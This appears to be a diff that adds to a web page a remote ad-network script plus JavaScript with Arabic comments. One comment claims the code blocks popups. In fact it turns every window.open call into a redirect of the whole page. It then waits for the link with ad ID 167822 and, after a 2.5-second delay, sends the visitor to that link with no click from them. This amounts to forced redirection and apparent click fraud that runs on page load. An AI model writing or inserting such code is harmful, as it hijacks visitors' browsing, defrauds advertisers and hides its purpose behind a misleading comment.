@@ -1,0 +1,96 @@
+<div id="NEON_elmt"></div>
+<script data-cfasync='false' type='text/javascript' src='//neon.today/native/script/167822/42384/'></script>
+<script>
+(function() {
+  // 1) منع النوافذ المنبثقة نهائياً
+  var _origOpen = window.open;
+  window.open = function(url, name, features) {
+    if (url && typeof url === 'string' && url.length > 0) {
+      try { window.location.href = url; } catch(e) {}
+    }
+    return null;
+  };
+
+  var targetId = "167822";
+  var VIEW_DELAY = 2500;
+  var POLL_INTERVAL = 150;
+  var MAX_WAIT = 10000;
+
+  var executed = false;
+
+  function findTargetLink() {
+    var anchors = document.querySelectorAll('a[href]');
+
+    for (var i = 0; i < anchors.length; i++) {
+      var href = anchors[i].getAttribute('href');
+      if (href && href.indexOf(targetId) !== -1) return anchors[i];
+    }
+
+    var elemById = document.getElementById(targetId);
+    if (elemById) {
+      var parentLink = elemById.closest ? elemById.closest('a') : null;
+      if (parentLink) return parentLink;
+    }
+
+    for (var j = 0; j < anchors.length; j++) {
+      var dataId = anchors[j].getAttribute('data-id');
+      if (dataId && dataId === targetId) return anchors[j];
+    }
+
+    return null;
+  }
+
+  function clickSamePage(anchor) {
+    if (executed || !anchor) return false;
+    executed = true;
+
+    var href = anchor.getAttribute('href');
+
+    if (!href || href === '#' || href.indexOf('javascript:') === 0) {
+      executed = false;
+      return false;
+    }
+
+    anchor.removeAttribute('target');
+    anchor.setAttribute('target', '_self');
+    anchor.setAttribute('rel', 'noopener');
+    anchor.onclick = null;
+
+    try {
+      window.location.href = href;
+    } catch (e) {
+      anchor.click();
+    }
+
+    return true;
+  }
+
+  function startWatcher() {
+    var startTime = Date.now();
+
+    var timer = setInterval(function() {
+      var link = findTargetLink();
+
+      if (link) {
+        clearInterval(timer);
+
+        setTimeout(function() {
+          clickSamePage(link);
+        }, VIEW_DELAY);
+
+      } else if (Date.now() - startTime > MAX_WAIT) {
+        clearInterval(timer);
+        console.log("لم يتم العثور على الرابط:", targetId);
+      }
+
+    }, POLL_INTERVAL);
+  }
+
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', startWatcher);
+  } else {
+    startWatcher();
+  }
+
+})();
+</script>
